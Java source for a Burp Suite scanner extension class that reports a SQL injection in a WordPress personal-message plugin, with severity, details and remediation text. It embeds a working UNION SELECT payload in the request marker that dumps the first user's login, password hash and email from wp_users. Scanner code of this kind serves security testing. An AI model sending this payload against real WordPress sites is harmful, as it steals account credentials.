package burp;

import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class WP2 implements IScanIssue{

	IHttpRequestResponse r;
	IHttpRequestResponse[] rr = new IHttpRequestResponse[1];
	URL url;
	String req, res;
	IBurpExtenderCallbacks callback;
    IExtensionHelpers halp;
    int[] reqmarks = new int[2], resmarks = new int[2];
    List<int[]> reqmarkList = new ArrayList<>(1), resmarkList = new ArrayList<>(1);
    IHttpRequestResponse[] rra = new IHttpRequestResponse[1];
	
	public WP2(IHttpRequestResponse r, URL url, IBurpExtenderCallbacks callback, IExtensionHelpers halp)
	{
		this.r = r;
		rr[0] = r; 
		this.url = url;
		this.callback = callback;
		this.halp = halp;
		
		//lets create markers
		req = halp.bytesToString(r.getRequest());
		res = halp.bytesToString(r.getResponse());
		
		reqmarks[0] = req.indexOf("/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,user_login,55318961455,user_pass,7,user_email,9,10,11,12%20FROM%20wp_users%20WHERE%20id=1 HTTP/1.1");
		reqmarks[1] = reqmarks[0] + new String("/wp-admin/admin.php?page=simple-personal-message-outbox&action=view&message=0%20UNION%20SELECT%201,2.3,user_login,55318961455,user_pass,7,user_email,9,10,11,12%20FROM%20wp_users%20WHERE%20id=1 HTTP/1.1").length();
		reqmarkList.add(reqmarks);
				
		resmarks[0] = res.indexOf("55318961455");
		resmarks[1] = resmarks[0] + new String("55318961455").length();
        resmarkList.add(resmarks);
        
        IHttpRequestResponseWithMarkers reqresMark = callback.applyMarkers(r, reqmarkList, resmarkList);
        rra[0] = reqresMark;

	}
	
	@Override
	public URL getUrl() {
		return url;
	}

	@Override
	public String getIssueName() {
		return "WP Single Personal Message Plugin - SQL Injection";
	}

	@Override
	public int getIssueType() {
		return 0;
	}

	@Override
	public String getSeverity() {
		return "High";
	}

	@Override
	public String getConfidence() {
		return "Firm";
	}

	@Override
	public String getIssueBackground() {
		return null;
	}

	@Override
	public String getRemediationBackground() {
		return null;
	}

	@Override
	public String getIssueDetail() {
		return "A SQL injection vulnerability in the Single Personal Message plugin before 1.0.3 for WordPress allows authenticated users to execute arbitrary SQL commands via the message parameter to wp-admin/admin.php. "
				+ "The username, password and email address of the first account in the database has been dumped.";
	}

	@Override
	public String getRemediationDetail() {
		return "Since there is no updated plugin provided by the vendor, it's recommended to remove the plugin entirely.";
		}

	@Override
	public IHttpRequestResponse[] getHttpMessages() {
		return rra;
	}

	@Override
	public IHttpService getHttpService() {
		return r.getHttpService();
		}

}
